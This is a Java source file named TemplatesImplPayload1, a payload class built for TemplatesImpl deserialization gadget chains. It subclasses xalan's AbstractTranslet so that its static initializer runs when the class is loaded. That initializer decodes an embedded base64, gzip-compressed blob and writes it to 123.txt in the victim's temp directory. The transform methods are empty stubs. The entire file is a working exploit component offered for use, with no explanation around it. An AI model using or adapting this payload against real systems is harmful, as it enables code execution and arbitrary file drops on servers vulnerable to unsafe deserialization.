package com.xhstormr.app;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.GZIPInputStream;

public class TemplatesImplPayload1 extends AbstractTranslet {

    static {
        try {
            String base64 = "H4sIAAAAAAACA6VWy1cbVRj/XUhy08lAAoW26cNaH20gwWBtq4aKfdgqGgICbU3ra5oMMHQyk04m5eGj1rcuPMdlt27Ylk1o7TniinN07//gyrXHhfG7dyZAIO1Gwvlmvt/33e91fzc3v//78y8ATuC7MLQwbofxRRjfclznsDhsjjLHTQ6Ho8LhclQ5bnHMcyxwLHIscXzE8THHJxyfKgjiNQUhPC/ECSHOK+DiLYxBBbtwToGCswoiSCtQ8ZKCDrwoREZBJ04piOIFBTFhjeG4EK8o6MarQpyJoAunhRiOoAcnI+jFyxHswZCKa3hLiFEhxlS8jwkVH+CKig+FoYi8Cl1g05hUMYMLKmYxpcLAGyrmcFHFDWRVlPCmis/wuoo7eFvF5xhX8SVyKr7CZRVfY0TFN7jEsDfRl53Tbmlpw06PWOWqO+k6ulYaaraMO4blXnEMV3fI0tOwmJo1kx67PqcXXIJ7m+CJquUaJX2HO8U3rBmC9zTgqmuY6REKrbm2CN+e6Lss5VWGfYmW1QmHLaat5QnT7k3ThK4VffRoYmfVLRtJPNpR1jpWdg3b0kzZcwtXqvtYYmfLW3ONO3ZBr1SGtlXVwnNjXn2PdpRVnXUcbTFrVNztZTV8t8xM4lOzjj2vXTd1aTrsmRbSFd25Zepu+qJh0jzP29a04S0+s91j0ntO6DerOqV9lLVStq2Kl+Ta/wvRusJZzbBk9NBpwzLcYYbAebuoM3RMulrhxqhWnhJdEqW0YpFQkpPVctmh+eukBwumXRHWQom0AwW7lF6YrRAVS05aK5f9LCOlssnAi1SlYy8yhIu2Z6C0VLxmViitvqAXGDpndHcLWRlUAsY1Ryvp0l8h1T8dDLtI8ZhL0We1Sk5fcCmSaISSGP6poNPSIPS56vS07uhFj9jE9RbngyHeAt2xYsuxaaCSGBcWCrqkOENsO7sZunawuAnb6Cy2nYFNOTbI10CbOczQvfO7oQlsHEL6fmnFCn8ELcnCcPBxLGQ49Fga0o6buk3/tE+W3C7Fns5VTdNrJ2Q7F0zhFShrYjbRshizpOKUoxXIwCViUh1h2pdi1rAI7BKv/kDHqi7tGoWan7W1koEjdBlFQJOi2y1IT7oiSL5LWhc9mUD7V3F4BeKP0R1x1TffQztdXECxuy3Z3f4AA22o4elTgWQ3k8p9JLoDNfT9is5MsDdwFydTD/AcQ7Y/HlzF3hqOjRLQz3AXvfSSZCDPXHKghkPL9T9XkjU8sTKQJEuqHSuUcxCXcJmuRYb3KOtxBOrIUAkcuziVir+xv054mwDAOJQ6AvTh6OXYw+kiFDa6lrzq2W/ULCfsp4eI5Vfx7Oh9PEUpj9TwZJblHiKUf4hwPrmKg6vYlwmwTDBOzezPZ0Lr6EjFQzUcvbJc/0uA8WWkCCeP0NpoPLiOvT7akwnE5bJnlhGWWGotuY5BynNgGX35TCAXD6yNEnRgYB27PTiWHUjKFVzoqbXUPfpR0IdhXKRLXzxzVPUU8tRFlLAxqffCxhLp4nmH9O/xA34kfYku5zty38TM/kBnnUKEqHHOEQtyhILAP+ipEyJReBiNL9qMEeCjHY31UTHABhqR45SoWEZBaXuY3B6RCqjTzgW8cP6SkK9vBokSItRNJNyIEBUR2ukD/5157zHZnIl3fFJ2yG0mrMHXwgadO6S+YcJ/ijWkRdIJAAA=";
            byte[] bytes = ungzip(Base64.getDecoder().decode(base64));
            Path path = Paths.get(System.getProperty("java.io.tmpdir"), "123.txt");
            System.out.println(path);
            Files.write(path, bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static byte[] ungzip(byte[] bytes) throws Exception {
        GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(bytes));
        ByteArrayOutputStream out = new ByteArrayOutputStream();

        byte[] buf = new byte[2 * 1024];
        for (int read; (read = in.read(buf)) != -1; ) {
            out.write(buf, 0, read);
        }

        return out.toByteArray();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
